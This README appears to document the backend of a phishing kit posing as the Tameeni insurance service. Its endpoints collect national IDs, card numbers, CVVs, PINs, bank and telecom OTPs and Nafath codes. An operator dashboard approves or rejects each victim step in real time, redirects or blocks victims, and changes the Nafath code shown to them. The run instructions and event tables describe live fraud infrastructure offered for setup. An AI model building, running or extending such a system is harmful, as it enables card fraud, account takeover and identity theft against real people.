# Tameeni backend

Express + Socket.IO + SQLite backend that matches the event names and payload
shapes the admin dashboard in this repo already listens for.

## Run

```bash
cd backend
npm install
npm start        # listens on :3001
```

Env vars:

- `PORT` (default `3001`)
- `CORS_ORIGIN` — `*` or comma-separated origins
- `DB_PATH` — SQLite file (default `./data/app.db`)
- `ADMIN_TOKEN` — optional bearer required for destructive admin HTTP calls

Point the dashboard at it:

```
VITE_BACKEND_WS_URL=http://localhost:3001
```

## HTTP endpoints

Admin (used by the dashboard):

- `GET /users` — all sessions, newest first
- `GET /users/:id` — one session
- `DELETE /users/:id` — delete (needs `Authorization: Bearer $ADMIN_TOKEN` if set)

Customer ingest (each upserts the session and broadcasts the matching
socket event to the `admin` room):

| Endpoint         | Socket event  | Typical payload fields                                 |
| ---------------- | ------------- | ------------------------------------------------------ |
| `POST /newData`  | `newData`     | `_id`, `national_id`, `phone`, `car_*`, `tameen*`      |
| `POST /paymentForm` | `paymentForm` | `_id`, `cardNumber`, `cvv`, `expiryDate`, `card_name` |
| `POST /visaOtp`  | `visaOtp`     | `_id`, `CardOtp` (or `otp`), `pin`                     |
| `POST /phone`    | `phone`       | `_id`, `MotslPhone`, `MotslNetwork`                    |
| `POST /phoneOtp` | `phoneOtp`    | `_id`, `MotslOtp` (or `otp`), `phoneId`                |
| `POST /mobOtp`   | `mobOtp`      | `_id`, `MotslOtp`                                      |
| `POST /navaz`    | `navaz`       | `_id`, `NavazOtp`, `Customs_card`                      |

Every ingest broadcasts the full merged session record as the event payload,
which is exactly what the admin dashboard invalidates its query on.

## Socket.IO

Join rooms:

```js
socket.emit("join", { role: "admin" });                 // admin dashboard
socket.emit("join", { role: "client", id: sessionId }); // customer app
```

Admin -> customer step decisions (dashboard already emits these):

```
acceptService / declineService
acceptPaymentForm / declinePaymentForm
acceptVisaOtp / declineVisaOtp
acceptPhone / declinePhone
acceptPhoneOTP / declinePhoneOTP
acceptMobOtp / declineMobOtp
acceptMotslOtp / declineMotslOtp
acceptStcPhoneOtp / declineStcPhoneOtp
acceptSTC / declineSTC
acceptNavaz / declineNavaz
```

Each of these takes the session id (string) as its payload. The backend
updates the corresponding accept flag on the session, forwards the event to
`client:<id>` so the customer app can advance, and emits `sessionUpdated` to
the admin room.

Other admin -> customer events:

- `adminRedirect` — `{ id, path, search, session }`
- `clientBlocked` — session id (also flips `blocked=true` and persists)
- `changeNavazCode` — `{ id, code }`

Customer -> server (alternative to HTTP ingest):

```js
socket.emit("ingest", { event: "paymentForm", _id, cardNumber, cvv, expiryDate });
```
